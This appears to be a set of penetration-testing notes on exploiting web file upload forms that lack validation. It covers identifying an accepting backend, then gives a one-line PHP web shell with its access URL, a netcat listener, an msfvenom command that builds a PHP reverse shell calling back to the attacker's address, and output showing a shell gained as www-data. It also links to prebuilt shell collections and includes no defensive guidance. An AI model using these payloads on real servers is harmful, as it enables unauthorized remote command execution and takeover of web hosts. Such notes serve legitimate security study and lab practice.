## File Upload Attacks – Absent Validation
### Summary

- ###### No validation leads to unauthenticated arbitrary file uploads.
- ###### Attackers can upload PHP web shells or reverse shells directly.
### Steps to Identify
###### 1. Try uploading `.php` files – if accepted, backend has no validation.
###### 2. Check UI clues – file type not restricted in upload dialog (`All Files` shown).
###### 3. Check backend tech:
###### - Try `/index.php`, `/index.asp`, etc.       
###### - Use tools like Wappalyzer, Burp Intruder with:
   ######        - [`web-extensions.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
## Upload Exploitation
### Web Shells
#### Prebuilt Web Shells
- ###### Example: [phpbash](https://github.com/Arrexel/phpbash)
- ###### Provides terminal-like interface via browser.
- ###### Others in: [`/Web-Shells`](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
#### Manual Web Shell

```php
<?php system($_REQUEST['cmd']); ?>
```
- ###### Access: `http://SERVER/uploads/shell.php?cmd=id`    
- ###### Simple and functional, useful when external tools unavailable.
### Reverse Shells
#### Prebuilt Reverse Shells
- ###### Example: [Pentestmonkey PHP Shell](https://github.com/pentestmonkey/php-reverse-shell)
- ###### Set `LHOST` and `LPORT`, start `nc` listener.

```bash
$ nc -lvnp 4444
```
#### Generate with `msfvenom`

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
- ###### Upload and visit `reverse.php` to get shell.
#### Shell received

```bash
connect to [OUR_IP] from [TARGET_IP]
uid=33(www-data) gid=33(www-data)
```
## Wordlists Used

- ###### Web Extensions: [`web-extensions.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
- ###### Web Shells: [`Web-Shells`](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
# Tags
>  #Web-Exploitation #Exploitation #File-Upload-Attacks